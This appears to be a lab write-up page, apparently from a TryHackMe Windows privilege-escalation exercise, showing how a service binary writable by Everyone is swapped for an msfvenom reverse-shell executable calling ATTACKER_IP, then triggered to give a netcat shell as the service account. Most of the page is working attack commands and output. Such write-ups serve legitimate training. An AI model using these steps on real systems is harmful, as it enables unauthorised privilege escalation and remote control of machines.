---
sidebar_position: 1
---

# Insecure Permissions

- <b style={{ color: 'MediumTurquoise' }}>WindowsScheduler</b> Service has <span style={{fontWeight: 'Bold'}}>Weak Permissions</span> that allows the Modification - Replacement. It is possible to gain the Privileges of the Service.

- **The Service runs as User:** `svcusr1`

```log
C:\> sc qc "WindowsScheduler"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser
```

<br/>

- Group <b style={{ color: 'DeepSkyBlue' }}>Everyone:(I)(M)</b> has <span style={{fontWeight: 'Bold'}}>Modify</span> Permissions on the Service Executable.

```log
C:\Users\thm-unpriv> icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

<br/>
<br/>

- Generating and Transfering the **PAYLOAD**

```js
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
```

<br/>

- Replacing the Service Executable with our **PAYLOAD.**
- We need another User to execute the **PAYLOAD**, so we grant Full Permission to the **Everyone Group:** <b style={{ color: 'DeepSkyBlue' }}>Everyone:(F)</b>

```powershell
C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
```

<br/>

- Starting a `netcat` Listener
- Restarting the <b style={{ color: 'MediumTurquoise' }}>WindowsScheduler</b> Service. <span style={{fontWeight: 'Bold'}}>(In a Normal case Scenario we would have to Wait for a Service Restart)</span>

```log
C:\> sc stop  "WindowsScheduler"
C:\> sc start "WindowsScheduler"
```

```bash
attacker@machine:~$ nc -lvp 4445
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
wprivesc1\svcusr1
```